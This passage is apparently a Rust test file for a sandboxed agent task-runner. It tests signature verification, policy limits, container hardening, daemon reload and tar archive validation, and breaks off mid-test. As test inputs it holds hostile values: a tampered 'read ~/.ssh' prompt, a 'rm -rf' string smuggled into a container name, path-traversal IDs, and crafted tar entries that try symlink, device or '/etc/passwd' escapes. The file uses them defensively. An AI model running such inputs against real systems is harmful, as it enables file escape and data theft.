use crate::audit::AuditLog;
use crate::harness::EchoHarness;
use crate::manifest::*;
use crate::policy::Policy;
use crate::queue::{InMemoryQueue, QueueClient};
use crate::runner::{Runner, Tick};
use crate::sandbox::DirSandbox;
use chrono::{Local, TimeZone};
use ed25519_dalek::SigningKey;
use std::collections::BTreeMap;

fn task(id: &str, project: &str, cost: u64, _key: &SigningKey) -> TaskManifest {
    TaskManifest {
        id: id.into(), project_id: project.into(), kind: "summarise".into(), inputs: "0".repeat(64),
        prompt: "hi".into(), tool_requirements: vec!["echo".into()], sandbox_profile: SandboxProfile::default(),
        cost_estimate: cost, output_schema: OutputSchema { format: "text".into(), max_bytes: 100, max_artifact_bytes: 0 }, redundancy: 1, task: None, attempt: None,
    }
}

/// A manifest for tests elsewhere in the crate.
pub(crate) fn github_queue_task(id: &str) -> TaskManifest {
    task(id, "a", 10, &crate::manifest::generate_key())
}

fn policy() -> Policy {
    Policy {
        daily_token_cap: 1000, project_shares: BTreeMap::from([("a".into(), 1), ("b".into(), 1)]),
        allowed_kinds: vec!["summarise".into()], quiet_hours: None, review_before_submit: false,
        max_profile: SandboxProfile::default(), abort_margin_pct: 25, available_tools: vec!["echo".into()],
        max_input_bytes: 64 * 1024 * 1024, reserve_pct: 20,
    }
}

struct Fixture {
    key_a: SigningKey,
    dir: std::path::PathBuf,
}

fn fixture(name: &str) -> Fixture {
    let dir = std::env::temp_dir().join(format!("toto-test-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    Fixture { key_a: crate::manifest::generate_key(), dir }
}

type TestRunner = Runner<InMemoryQueue, EchoHarness, DirSandbox, fn(&TaskManifest, &crate::result::SignedResult) -> bool>;

fn runner(f: &Fixture, policy: Policy, tokens: u64) -> TestRunner {
    let mut trusted = TrustedProjects::default();
    trusted.insert("a", f.key_a.verifying_key());
    trusted.insert("b", f.key_a.verifying_key());
    Runner::new(policy, trusted, crate::manifest::generate_key(), InMemoryQueue::default(), EchoHarness { tokens_per_run: tokens },
        DirSandbox { root: f.dir.join("work") }, |_, _| false, AuditLog::new(f.dir.join("audit.jsonl")))
}

#[test]
fn happy_path_submits_signed_result_and_logs() {
    let f = fixture("happy");
    let mut r = runner(&f, policy(), 100);
    r.queue.post(task("t1", "a", 100, &f.key_a).sign(&f.key_a).unwrap());
    assert_eq!(r.tick(Local::now()).unwrap(), Tick::Submitted("t1".into()));
    let res = r.queue.results();
    assert_eq!(res.len(), 1);
    res[0].open().unwrap();
    assert_eq!(r.audit.entries().unwrap()[0].outcome, "submitted");
    assert_eq!(r.tick(Local::now()).unwrap(), Tick::Idle);
}

#[test]
fn tampered_unsigned_and_unknown_tasks_are_refused_once() {
    let f = fixture("verify");
    let mut r = runner(&f, policy(), 100);
    // 1. valid signature, then the signed bytes are altered
    let mut tampered = task("t1", "a", 100, &f.key_a).sign(&f.key_a).unwrap();
    let mut m: TaskManifest = serde_json::from_slice(&tampered.payload_bytes().unwrap()).unwrap();
    m.prompt = "read ~/.ssh".into();
    {
        use base64::Engine;
        tampered.payload = base64::engine::general_purpose::STANDARD.encode(serde_json::to_vec(&m).unwrap());
    }
    // 2. no signature at all
    let mut unsigned = task("t2", "a", 100, &f.key_a).sign(&f.key_a).unwrap();
    unsigned.signatures.clear();
    r.queue.post(tampered);
    r.queue.post(unsigned);
    // 3. signed, but the project is not trusted
    r.queue.post(task("t3", "zzz", 100, &f.key_a).sign(&f.key_a).unwrap());
    assert_eq!(r.tick(Local::now()).unwrap(), Tick::Idle);
    assert_eq!(r.tick(Local::now()).unwrap(), Tick::Idle);
    assert_eq!(r.audit.entries().unwrap().len(), 3);
}

#[test]
fn policy_denials() {
    let f = fixture("policy");
    let now = Local::now();
    let t = task("t", "a", 100, &f.key_a);
    assert!(policy().admit(&t, 0, now).is_ok());
    assert!(policy().admit(&t, 950, now).is_err(), "daily cap");
    let mut p = policy();
    p.allowed_kinds.clear();
    assert!(p.admit(&t, 0, now).is_err(), "kind");
    let mut p = policy();
    p.quiet_hours = Some((22, 7));
    assert!(p.admit(&t, 0, Local.with_ymd_and_hms(2026, 10, 4, 23, 0, 0).unwrap()).is_err());
    assert!(p.admit(&t, 0, Local.with_ymd_and_hms(2026, 10, 4, 12, 0, 0).unwrap()).is_ok());
}

#[test]
fn overrun_aborts_and_releases_lease() {
    let f = fixture("abort");
    let mut r = runner(&f, policy(), 500); // estimate 100 + 25% margin = 125 < 500
    r.queue.post(task("t1", "a", 100, &f.key_a).sign(&f.key_a).unwrap());
    assert_eq!(r.tick(Local::now()).unwrap(), Tick::Dropped("t1".into()));
    assert_eq!(r.audit.entries().unwrap()[0].outcome, "aborted");
    assert!(r.queue.results().is_empty());
    assert_eq!(r.queue.available().unwrap().len(), 1, "lease released");
}

#[test]
fn invalid_output_fails() {
    let f = fixture("schema");
    let mut r = runner(&f, policy(), 10);
    let mut t = task("t1", "a", 100, &f.key_a);
    t.output_schema.format = "json".into(); // echo output is not JSON
    r.queue.post(t.sign(&f.key_a).unwrap());
    assert_eq!(r.tick(Local::now()).unwrap(), Tick::Dropped("t1".into()));
    assert_eq!(r.audit.entries().unwrap()[0].outcome, "failed");
}

#[test]
fn review_can_block_submission() {
    let f = fixture("review");
    let mut p = policy();
    p.review_before_submit = true;
    let mut r = runner(&f, p, 100); // reviewer always declines
    r.queue.post(task("t1", "a", 100, &f.key_a).sign(&f.key_a).unwrap());
    assert_eq!(r.tick(Local::now()).unwrap(), Tick::Dropped("t1".into()));
    assert!(r.queue.results().is_empty());
}

#[test]
fn resource_shares_balance_projects() {
    let f = fixture("shares");
    let mut r = runner(&f, policy(), 100);
    for i in 0..4 {
        r.queue.post(task(&format!("a{i}"), "a", 100, &f.key_a).sign(&f.key_a).unwrap());
        r.queue.post(task(&format!("b{i}"), "b", 100, &f.key_a).sign(&f.key_a).unwrap());
    }
    let mut order = vec![];
    for _ in 0..4 {
        if let Tick::Submitted(id) = r.tick(Local::now()).unwrap() {
            order.push(id.chars().next().unwrap());
        }
    }
    assert_eq!(order.iter().filter(|c| **c == 'a').count(), 2, "{order:?}");
}

#[test]
fn leases_are_exclusive() {
    let q = InMemoryQueue::default();
    let d = std::time::Duration::from_secs(60);
    q.claim("t", "r1", d).unwrap();
    assert!(q.claim("t", "r2", d).is_err());
    assert!(q.heartbeat("t", "r1", d).is_ok());
    assert!(q.heartbeat("t", "r2", d).is_err());
}

mod docker {
    use crate::manifest::SandboxProfile;
    use crate::sandbox::{DockerSandbox, Environment, Sandbox};

    fn env(image: &str, network: bool) -> Environment {
        Environment { image: image.into(), network }
    }

    #[test]
    fn run_args_are_hardened() {
        let mut sb = DockerSandbox::new();
        sb.runtime = Some("runsc".into());
        let a = sb.run_args("t1", &env("ghcr.io/a/b@sha256:aa", false), &SandboxProfile::default()).unwrap().join(" ");
        for want in ["--network none", "--read-only", "--cap-drop ALL", "no-new-privileges", "--user 65534:65534",
            "--pids-limit 256", "--cpus 1.00", "--memory 1024m", "--runtime runsc", "--entrypoint ", "ghcr.io/a/b@sha256:aa sleep 600"] {
            assert!(a.contains(want), "missing `{want}` in {a}");
        }
        assert!(!a.contains(" -v ") && !a.contains("--mount"), "no host mounts");
    }

    #[test]
    fn a_network_needs_the_contributors_fenced_bridge() {
        let sb = DockerSandbox::new();
        assert!(sb.run_args("t1", &env("img", true), &SandboxProfile::default()).is_err(), "no fence configured: refuse");
        let mut sb = DockerSandbox::new();
        sb.network = Some("toto-egress".into());
        let a = sb.run_args("t1", &env("img", true), &SandboxProfile::default()).unwrap().join(" ");
        assert!(a.contains("--network toto-egress") && a.contains("--cap-drop ALL") && a.contains("--read-only"), "{a}");
        let none = sb.run_args("t1", &env("img", false), &SandboxProfile::default()).unwrap().join(" ");
        assert!(none.contains("--network none"), "an agent that needs no network gets none even when a fence exists: {none}");
    }

    #[test]
    fn tasks_need_an_approved_environment() {
        let f = super::fixture("noenv");
        let sb = DockerSandbox::new();
        let t = super::task("x", "unknown", 1, &f.key_a);
        assert!(sb.environment_for(&t.project_id).unwrap_err().to_string().contains("no approved environment"));
    }

    #[test]
    fn container_names_are_sanitised() {
        assert_eq!(DockerSandbox::container_name("a/b;rm -rf"), "toto-abrm-rf");
    }

    /// Runs the isolation checks against a real daemon; skips (returns) if it is unavailable.
    fn live(bin: &str, runtime: Option<&str>, id: &str) {
        let have_image = std::process::Command::new(bin).args(["image", "inspect", "alpine"]).output().is_ok_and(|o| o.status.success());
        if !have_image {
            eprintln!("skipping {bin}: no daemon or alpine image");
            return;
        }
        let f = super::fixture(id);
        let t = super::task(id, "a", 1, &f.key_a);
        let mut sb = DockerSandbox::new();
        sb.bin = bin.into();
        sb.runtime = runtime.map(Into::into);
        sb.environments.insert("a".into(), env("alpine", false));
        let ws = sb.create(&t, &t.sandbox_profile).unwrap();
        let run = |cmd: &str| std::process::Command::new(&ws.exec_prefix[0]).args(&ws.exec_prefix[1..]).args(["sh", "-c", cmd]).output().unwrap();
        let checks = [
            (run("echo hi > /workspace/x && cat /workspace/x").status.success(), "workspace writable"),
            (!run("touch /etc/x").status.success(), "rootfs read-only"),
            (!run("wget -T 2 -q -O- http://1.1.1.1").status.success(), "no network"),
            (!run("ls /home/user /root").status.success(), "no host fs"),
        ];
        sb.destroy(ws).unwrap();
        for (ok, what) in checks {
            assert!(ok, "{bin} {runtime:?}: {what}");
        }
    }

    #[test]
    fn live_docker() {
        live("docker", None, "live-docker");
    }

    #[test]
    fn live_docker_gvisor() {
        live("docker", Some("runsc"), "live-docker-gvisor");
    }

    #[test]
    fn live_podman() {
        live("podman", None, "live-podman");
    }

    #[test]
    fn live_podman_gvisor() {
        live("podman", Some("runsc"), "live-podman-gvisor");
    }
}

mod daemon {
    use super::{fixture, task, policy};
    use crate::config::*;
    use crate::manifest::generate_key;
    use crate::queue::{DirQueue, QueueClient};
    use crate::sandbox::{exec, DirSandbox, Workspace};
    use std::time::Duration;

    fn config(dir: &std::path::Path, project_key: &ed25519_dalek::SigningKey, sandbox: SandboxConfig) -> Config {
        let mut c = Config::starter(dir);
        c.poll_secs = 1;
        c.sandbox = sandbox;
        c.harness = HarnessConfig::Echo { tokens_per_run: 1 };
        c.policy = policy();
        c.projects.insert("a".into(), hex::encode(project_key.verifying_key().to_bytes()));
        c
    }

    #[test]
    fn dirqueue_leases_and_results() {
        let f = fixture("dirq");
        let q = DirQueue::new(f.dir.join("q")).unwrap();
        q.post(&task("t1", "a", 10, &f.key_a).sign(&f.key_a).unwrap()).unwrap();
        assert_eq!(q.available().unwrap().len(), 1);
        let d = Duration::from_secs(60);
        q.claim("t1", "r1", d).unwrap();
        assert!(q.claim("t1", "r2", d).is_err());
        assert!(q.heartbeat("t1", "r2", d).is_err());
        assert!(q.available().unwrap().is_empty());
        q.release("t1", "r1").unwrap();
        assert_eq!(q.available().unwrap().len(), 1);
        q.claim("t1", "r2", Duration::ZERO).unwrap(); // instantly expired
        q.claim("t1", "r1", d).unwrap(); // expired lease can be taken over
        assert!(q.post(&crate::manifest::TaskManifest { id: "../evil".into(), ..task("x", "a", 1, &f.key_a) }.sign(&f.key_a).unwrap()).is_err());
    }

    #[test]
    fn exec_times_out_and_captures_output() {
        let f = fixture("exec");
        let ws = Workspace { task_id: "x".into(), path: f.dir.clone(), exec_prefix: vec![] };
        let ok = exec(&ws, &["sh", "-c", "echo hi"], Duration::from_secs(5)).unwrap();
        assert_eq!(String::from_utf8_lossy(&ok.stdout).trim(), "hi");
        let started = std::time::Instant::now();
        assert!(exec(&ws, &["sleep", "30"], Duration::from_millis(200)).is_err());
        assert!(started.elapsed() < Duration::from_secs(5));
    }

    #[test]
    fn config_roundtrip_and_review_refused() {
        let f = fixture("cfg");
        let mut c = config(&f.dir, &f.key_a, SandboxConfig::Docker { bin: "docker".into(), runtime: None, nested_userns: false, network: None });
        let json = serde_json::to_string(&c).unwrap();
        assert!(serde_json::from_str::<Config>(&json).is_ok());
        c.policy.review_before_submit = true;
        assert!(c.build().is_err());
    }

    #[test]
    fn service_unit_mentions_config() {
        let u = crate::service::unit_contents(std::path::Path::new("/usr/bin/toto"), std::path::Path::new("/h/config.json"));
        assert!(u.contains("/usr/bin/toto") && u.contains("run") && u.contains("/h/config.json"));
        assert!(crate::service::install(std::path::Path::new("/tmp"), std::path::Path::new("x"), std::path::Path::new("rel")).is_err());
    }

    /// The contributor's pause: the daemon takes nothing while the marker exists, says so in its
    /// status, and picks the queue up within seconds of `resume`.
    #[tokio::test(flavor = "multi_thread")]
    async fn the_daemon_honours_a_pause_and_resumes() {
        let f = fixture("daemon-pause");
        let cfg = config(&f.dir, &f.key_a, SandboxConfig::Dir);
        let q = DirQueue::new(&cfg.queue_dir).unwrap();
        q.post(&task("p1", "a", 1000, &f.key_a).sign(&f.key_a).unwrap()).unwrap();
        crate::control::pause(&cfg.state_dir).unwrap();
        let (tx, rx) = tokio::sync::oneshot::channel::<()>();
        let state = cfg.state_dir.clone();
        let handle = tokio::spawn(crate::daemon::run(cfg, None, async { let _ = rx.await; }));
        tokio::time::sleep(Duration::from_millis(1500)).await;
        assert!(q.results().unwrap().is_empty(), "nothing taken while paused");
        let st = crate::daemon::Status::read(&state).unwrap();
        assert!(st.user_paused && st.state == "paused" && st.pause_reason.as_deref() == Some("paused by you"), "{st:?}");
        crate::control::resume(&state).unwrap();
        for _ in 0..100 {
            if q.results().unwrap().len() == 1 {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        assert_eq!(q.results().unwrap().len(), 1, "resumed within seconds");
        tx.send(()).unwrap();
        handle.await.unwrap().unwrap();
        let st = crate::daemon::Status::read(&state).unwrap();
        assert!(!st.user_paused && st.state == "stopped");
    }

    /// Config edits apply between tasks without a restart: a policy change admits a task it
    /// rejected; a broken edit is reported and the previous config keeps running; a reload
    /// never retries a task the runner already abandoned.
    #[tokio::test(flavor = "multi_thread")]
    async fn the_daemon_reloads_its_config_between_tasks() {
        let f = fixture("daemon-reload");
        let mut cfg = config(&f.dir, &f.key_a, SandboxConfig::Dir);
        cfg.ui_addr = None;
        cfg.policy.allowed_kinds.clear(); // nothing is admitted at first
        let path = f.dir.join("config.json");
        cfg.save(&path).unwrap();
        let q = DirQueue::new(&cfg.queue_dir).unwrap();
        q.post(&task("r1", "a", 1000, &f.key_a).sign(&f.key_a).unwrap()).unwrap();
        let (tx, rx) = tokio::sync::oneshot::channel::<()>();
        let state = cfg.state_dir.clone();
        let handle = tokio::spawn(crate::daemon::run(cfg.clone(), Some(path.clone()), async { let _ = rx.await; }));
        let log = || crate::audit::AuditLog::new(state.join("audit.jsonl")).entries().unwrap();
        let status = || crate::daemon::Status::read(&state).unwrap_or_default();
        async fn until(what: &str, mut ok: impl FnMut() -> bool) {
            for _ in 0..150 {
                if ok() {
                    return;
                }
                tokio::time::sleep(Duration::from_millis(100)).await;
            }
            panic!("timed out waiting for {what}");
        }

        until("the first rejection", || log().iter().any(|e| e.task_id == "r1" && e.outcome == "rejected")).await;
        assert!(q.results().unwrap().is_empty());

        // 1. The policy is edited (as the page or the CLI would): the rejected task now runs.
        cfg.policy.allowed_kinds = vec!["summarise".into()];
        cfg.save(&path).unwrap();
        until("r1 submitted after the reload", || q.results().unwrap().len() == 1).await;
        let st = status();
        assert_eq!((st.reloads, st.config_error.as_deref()), (1, None), "{st:?}");

        // 2. A task the runner abandons (its estimate is 0, so the meter aborts it at once).
        q.post(&task("r2", "a", 0, &f.key_a).sign(&f.key_a).unwrap()).unwrap();
        until("r2 aborted", || log().iter().any(|e| e.task_id == "r2" && e.outcome == "aborted")).await;

        // 3. A broken edit: reported, and the previous config keeps running.
        std::fs::write(&path, "{ not json").unwrap();
        until("the config error", || status().config_error.is_some()).await;
        assert!(status().config_error.unwrap().contains("previous config keeps running"));
        q.post(&task("r3", "a", 10, &f.key_a).sign(&f.key_a).unwrap()).unwrap(); // within the day's cap
        until("r3 submitted under the previous config", || q.results().unwrap().len() == 2).await;

        // 4. A valid edit again: applied, the error clears, and r2 is not retried by the new runner.
        cfg.poll_secs = 2;
        cfg.save(&path).unwrap();
        until("the second reload", || status().reloads == 2).await;
        assert!(status().config_error.is_none());
        tokio::time::sleep(Duration::from_millis(2500)).await;
        assert_eq!(log().iter().filter(|e| e.task_id == "r2" && e.outcome == "aborted").count(), 1, "an abandoned task is never retried, also across a reload");

        tx.send(()).unwrap();
        handle.await.unwrap().unwrap();
    }

    /// Each credential proxy has its own socket, so dropping the old runner after a reload
    /// cannot remove the new one's.
    #[test]
    fn each_proxy_gets_its_own_socket() {
        let f = fixture("proxy-sockets");
        let mut cfg = config(&f.dir, &f.key_a, SandboxConfig::Docker { bin: "docker".into(), runtime: None, nested_userns: false, network: None });
        cfg.harness = HarnessConfig::Omnigent { provider: ProviderConfig::Anthropic, upstream: Some("http://127.0.0.1:9".into()), token_file: None, api_key_file: None };
        std::fs::create_dir_all(&cfg.state_dir).unwrap();
        crate::secrets::save_token(&cfg.token_path(), "T").unwrap();
        let socks = || std::fs::read_dir(cfg.state_dir.join("proxy")).unwrap().count();
        let old = cfg.build().unwrap();
        let new = cfg.build().unwrap();
        assert_eq!(socks(), 2);
        drop(old);
        assert_eq!(socks(), 1, "dropping the old proxy leaves the new one's socket");
        drop(new);
        assert_eq!(socks(), 0);
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn daemon_processes_queue_and_stops_cleanly() {
        let f = fixture("daemon");
        let cfg = config(&f.dir, &f.key_a, SandboxConfig::Dir);
        let q = DirQueue::new(&cfg.queue_dir).unwrap();
        q.post(&task("d1", "a", 1000, &f.key_a).sign(&f.key_a).unwrap()).unwrap();
        let mut bad = task("d2", "a", 1000, &f.key_a).sign(&f.key_a).unwrap();
        {
            use base64::Engine;
            let mut m: crate::manifest::TaskManifest = serde_json::from_slice(&bad.payload_bytes().unwrap()).unwrap();
            m.prompt = "tampered".into(); // signature no longer matches the payload
            bad.payload = base64::engine::general_purpose::STANDARD.encode(serde_json::to_vec(&m).unwrap());
        }
        q.post(&bad).unwrap();
        let (tx, rx) = tokio::sync::oneshot::channel::<()>();
        let state = cfg.state_dir.clone();
        let handle = tokio::spawn(crate::daemon::run(cfg, None, async { let _ = rx.await; }));
        for _ in 0..600 {
            if q.results().unwrap().len() == 1 {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        tx.send(()).unwrap();
        handle.await.unwrap().unwrap();
        let res = q.results().unwrap();
        assert_eq!(res.len(), 1);
        res[0].open().unwrap();
        let status = crate::daemon::Status::read(&state).unwrap();
        assert_eq!((status.state.as_str(), status.submitted), ("stopped", 1));
        let log = crate::audit::AuditLog::new(state.join("audit.jsonl")).entries().unwrap();
        assert_eq!(log.iter().filter(|e| e.outcome == "rejected").count(), 1);
        let _ = (generate_key(), DirSandbox { root: f.dir.clone() });
    }
}

mod io_artifacts {
    use super::{fixture, policy, task};
    use crate::archive::{self, Limits, Record};
    use crate::audit::AuditLog;
    use crate::harness::Harness;
    use crate::manifest::*;
    use crate::meter::UsageMeter;
    use crate::queue::{DirQueue, InMemoryQueue, QueueClient};
    use crate::runner::{Runner, Tick};
    use crate::sandbox::{DirSandbox, DockerSandbox, Sandbox, Workspace};
    use chrono::Local;
    use ed25519_dalek::SigningKey;
    use std::os::unix::fs::PermissionsExt;

    fn path_of(r: &Record) -> String {
        match r {
            Record::File { path, .. } | Record::Deleted { path } => path.clone(),
        }
    }

    fn file(path: &str, data: &str) -> Record {
        Record::File { path: path.into(), mode: 0o644, data: data.as_bytes().to_vec() }
    }

    fn bundle(records: &[Record]) -> Vec<u8> {
        archive::to_bytes(records).unwrap()
    }

    #[test]
    fn archive_roundtrip_and_modes() {
        let f = fixture("arch-rt");
        let src = f.dir.join("src");
        std::fs::create_dir_all(src.join("sub")).unwrap();
        std::fs::write(src.join("a.txt"), "A").unwrap();
        std::fs::write(src.join("sub/run.sh"), "#!/bin/sh").unwrap();
        std::fs::set_permissions(src.join("sub/run.sh"), std::fs::Permissions::from_mode(0o755)).unwrap();
        std::os::unix::fs::symlink("/etc/passwd", src.join("link")).unwrap(); // must be ignored
        let recs = archive::pack_dir(&src, Limits::new(1 << 20)).unwrap();
        assert_eq!(recs.len(), 2, "symlink ignored: {recs:?}");
        let again = archive::from_bytes(&bundle(&recs), Limits::new(1 << 20)).unwrap();
        assert_eq!(recs, again);
        let dst = f.dir.join("dst");
        archive::unpack_to(&dst, &again).unwrap();
        assert_eq!(archive::baseline(&src, 100).unwrap(), archive::baseline(&dst, 100).unwrap());
        assert!(std::fs::metadata(dst.join("sub/run.sh")).unwrap().permissions().mode() & 0o111 != 0, "exec bit kept");
    }

    /// A raw tar entry with an arbitrary name and type (bypasses the builder's path checks).
    fn raw_entry(name: &str, ty: tar::EntryType, size: u64, link: Option<&str>, data: &[u8]) -> Vec<u8> {
        let mut h = tar::Header::new_gnu();
        h.as_old_mut().name[..name.len()].copy_from_slice(name.as_bytes());
        h.set_entry_type(ty);
        h.set_size(size);
        h.set_mode(0o644);
        if let Some(l) = link {
            h.set_link_name(l).unwrap();
        }
        h.set_cksum();
        let mut v = h.as_bytes().to_vec();
        v.extend_from_slice(data);
        v.resize(v.len().div_ceil(512) * 512, 0);
        v
    }

    fn tar_of(entries: &[Vec<u8>]) -> Vec<u8> {
        let mut v: Vec<u8> = entries.concat();
        v.extend(std::iter::repeat_n(0u8, 1024));
        v
    }

    #[test]
    fn archive_rejects_hostile_input() {
        use tar::EntryType as T;
        let lim = Limits::new(1000);
        for p in ["../x", "/abs", "a/../b", "a//b", "", "a/./b", "a\\b"] {
            assert!(!archive::valid_path(p), "{p:?}");
        }
        let reg = |name: &str| raw_entry(name, T::Regular, 1, None, b"x");
        for bad in ["../escape", "/etc/passwd", "a/../../b", "x/../../../y"] {
            assert!(archive::from_bytes(&tar_of(&[reg(bad)]), lim).is_err(), "path {bad:?}");
        }
        assert!(archive::from_bytes(&tar_of(&[reg("fine.txt")]), lim).is_ok());
        assert!(archive::from_bytes(&tar_of(&[raw_entry("l", T::Symlink, 0, Some("/etc/passwd"), b"")]), lim).is_err(), "symlink");
        assert!(archive::from_bytes(&tar_of(&[raw_entry("l", T::Link, 0, Some("fine.txt"), b"")]), lim).is_err(), "hardlink");
        assert!(archive::from_bytes(&tar_of(&[raw_entry("d", T::Char, 0, None, b"")]), lim).is_err(), "device");
        assert!(archive::from_bytes(&tar_of(&[raw_entry("p", T::Fifo, 0, None, b"")]), lim).is_err(), "fifo");
        assert!(archive::from_bytes(&tar_of(&[raw_entry(".wh..wh..opq", T::Regular, 0, None, b"")]), lim).is_err(), "opaque whiteout");
        assert!(archive::from_bytes(&tar_of(&[raw_entry("a/.wh.b", T::Regular, 1, None, b"x")]), lim).is_err(), "whiteout with content");
        assert!(archive::from_bytes(&tar_of(&[raw_entry("../.wh.x", T::Regular, 0, None, b"")]), lim).is_err(), "whiteout path traversal");
        // truncated data, and a size claim far beyond the limit (checked before allocating)
        let mut cut = raw_entry("a", T::Regular, 5, None, b"abc");
        cut.truncate(512 + 3);
        assert!(archive::from_bytes(&cut, lim).is_err(), "truncated");
        assert!(archive::from_bytes(&tar_of(&[raw_entry("big", T::Regular, 1 << 33, None, b"")]), lim).is_err(), "size lie");
        assert!(archive::from_bytes(&tar_of(&[reg("a"), raw_entry("b", T::Regular, 999, None, &[0u8; 999]), raw_entry("c", T::Regular, 999, None, &[0u8; 999])]), lim).is_err(), "total limit");
        assert!(archive::from_bytes(b"this is not a tar archive at all", lim).is_err(), "garbage");
        // Lenient mode (workspace dumps) skips special entries instead of failing.
        let dump = tar_of(&[raw_entry("l", T::Symlink, 0, Some("/etc/passwd"), b""), reg("kept.txt")]);
        let kept = archive::read_records(&dump[..], lim, archive::Mode::Lenient).unwrap();
        assert_eq!(kept, vec![file("kept.txt", "x")]);
    }

    #[test]
    fn whiteouts_roundtrip_and_interoperate_with_system_tar() {
        let f = fixture("tar-interop");
        let recs = vec![file("top.txt", "T"), file("dir/inner.txt", "I"), Record::Deleted { path: "gone.txt".into() }, Record::Deleted { path: "dir/old.txt".into() }];
        let bytes = bundle(&recs);
        assert_eq!(archive::from_bytes(&bytes, Limits::new(1000)).unwrap(), recs);
        // our tar is a real tar: the system tool lists it, with OCI-style whiteout names
        let path = f.dir.join("out.tar");
        std::fs::write(&path, &bytes).unwrap();
        let ls = std::process::Command::new("tar").args(["-tf"]).arg(&path).output().unwrap();
        let names: Vec<String> = String::from_utf8_lossy(&ls.stdout).lines().map(String::from).collect();
        assert_eq!(names, ["top.txt", "dir/inner.txt", ".wh.gone.txt", "dir/.wh.old.txt"], "{names:?}");
        // and a tar made by the system tool (with ./ prefixes and directory entries) is accepted
        let src = f.dir.join("src");
        std::fs::create_dir_all(src.join("sub")).unwrap();
        std::fs::write(src.join("a.txt"), "A").unwrap();
        std::fs::write(src.join("sub/b.txt"), "B").unwrap();
        let made = std::process::Command::new("tar").args(["-c", "-C"]).arg(&src).arg(".").output().unwrap().stdout;
        let mut got = archive::from_bytes(&made, Limits::new(1000)).unwrap();
        got.sort_by_key(path_of);
        assert_eq!(got, vec![file("a.txt", "A"), file("sub/b.txt", "B")]);
    }

    #[test]
    fn unpack_will_not_write_through_a_symlink() {
        let f = fixture("arch-link");
        let (root, outside) = (f.dir.join("root"), f.dir.join("outside"));
        std::fs::create_dir_all(&root).unwrap();
        std::fs::create_dir_all(&outside).unwrap();
        std::os::unix::fs::symlink(&outside, root.join("link")).unwrap();
        assert!(archive::unpack_to(&root, &[file("link/pwned.txt", "x")]).is_err());
        assert!(!outside.join("pwned.txt").exists());
    }

    #[test]
    fn changes_report_modified_new_and_deleted_only() {
        let f = fixture("arch-chg");
        let root = f.dir.join("w");
        archive::unpack_to(&root, &[file("keep.txt", "k"), file("mod.txt", "1"), file("gone.txt", "g")]).unwrap();
        let base = archive::baseline(&root, 100).unwrap();
        std::fs::write(root.join("mod.txt"), "2").unwrap();
        std::fs::write(root.join("new.txt"), "n").unwrap();
        std::fs::remove_file(root.join("gone.txt")).unwrap();
        let mut ch = archive::changes_since(&root, &base, Limits::new(100)).unwrap();
        ch.sort_by_key(path_of);
        assert_eq!(ch, vec![Record::Deleted { path: "gone.txt".into() }, file("mod.txt", "2"), file("new.txt", "n")]);
        assert!(archive::changes_since(&root, &base, Limits::new(1)).is_err(), "artifact cap enforced");
    }

    /// Reads and edits the workspace like an agent would.
    struct EditHarness;
    impl Harness for EditHarness {
        fn run(&self, _t: &TaskManifest, ws: &Workspace, meter: &mut UsageMeter) -> crate::Result<String> {
            meter.record(1)?;
            let a = std::fs::read_to_string(ws.path.join("src/a.txt")).map_err(|e| crate::Error::Harness(e.to_string()))?;
            std::fs::write(ws.path.join("src/a.txt"), format!("{a}+edited"))?;
            std::fs::remove_file(ws.path.join("old.txt"))?;
            std::fs::write(ws.path.join("new.txt"), "created")?;
            Ok(format!("saw {a}"))
        }
    }

    type R = Runner<std::sync::Arc<dyn QueueClient>, EditHarness, DirSandbox, fn(&TaskManifest, &crate::result::SignedResult) -> bool>;

    fn runner(f: &super::Fixture, queue: std::sync::Arc<dyn QueueClient>, policy: crate::policy::Policy) -> R {
        let mut trusted = TrustedProjects::default();
        trusted.insert("a", f.key_a.verifying_key());
        Runner::new(policy, trusted, crate::manifest::generate_key(), queue, EditHarness, DirSandbox { root: f.dir.join("work") }, |_, _| true, AuditLog::new(f.dir.join("audit.jsonl")))
    }

    fn job(f: &super::Fixture, inputs: &str, max_artifacts: u64) -> crate::dsse::Envelope {
        let mut t = task("t1", "a", 100, &f.key_a);
        t.inputs = inputs.into();
        t.output_schema.max_artifact_bytes = max_artifacts;
        t.sign(&f.key_a).unwrap()
    }

    fn input_bundle() -> Vec<u8> {
        bundle(&[file("src/a.txt", "A"), file("old.txt", "o")])
    }

    #[test]
    fn inputs_in_artifacts_out_signed() {
        let f = fixture("io-e2e");
        let q = std::sync::Arc::new(InMemoryQueue::default());
        let hash = q.post_bundle(input_bundle());
        q.post(job(&f, &hash, 1 << 20));
        let mut r = runner(&f, q.clone(), policy());
        assert_eq!(r.tick(Local::now()).unwrap(), Tick::Submitted("t1".into()));
        let res = q.results().remove(0);
        assert_eq!(res.open().unwrap().output, "saw A");
        let mut recs = res.artifact_records(1 << 20).unwrap();
        recs.sort_by_key(path_of);
        assert_eq!(recs, vec![file("new.txt", "created"), Record::Deleted { path: "old.txt".into() }, file("src/a.txt", "A+edited")]);
        // Tampering with the artifacts or their hash breaks verification.
        let mut t = res.clone();
        t.artifacts = Some(base64_of(&bundle(&[file("evil.sh", "x")])));
        assert!(t.open().is_err());
        let mut t = res.clone();
        {
            use base64::Engine;
            let mut body = res.open().unwrap();
            body.artifacts_hash = Some("0".repeat(64));
            t.envelope.payload = base64::engine::general_purpose::STANDARD.encode(serde_json::to_vec(&body).unwrap());
        }
        assert!(t.open().is_err(), "the signed hash cannot be swapped");
        assert!(!f.dir.join("work/t1").exists() && !f.dir.join("work/t1.baseline.json").exists(), "workspace and baseline cleaned up");
    }

    fn base64_of(b: &[u8]) -> String {
        use base64::Engine;
        base64::engine::general_purpose::STANDARD.encode(b)
    }

    #[test]
    fn no_artifacts_unless_the_schema_allows_them() {
        let f = fixture("io-noart");
        let q = std::sync::Arc::new(InMemoryQueue::default());
        let hash = q.post_bundle(input_bundle());
        q.post(job(&f, &hash, 0));
        let mut r = runner(&f, q.clone(), policy());
        assert_eq!(r.tick(Local::now()).unwrap(), Tick::Submitted("t1".into()));
        let res = q.results().remove(0);
        assert!(res.artifacts.is_none() && res.open().unwrap().artifacts_hash.is_none());
    }

    #[test]
    fn bad_inputs_fail_the_task_without_running_it() {
        let f = fixture("io-bad");
        let q = DirQueue::new(f.dir.join("q")).unwrap();
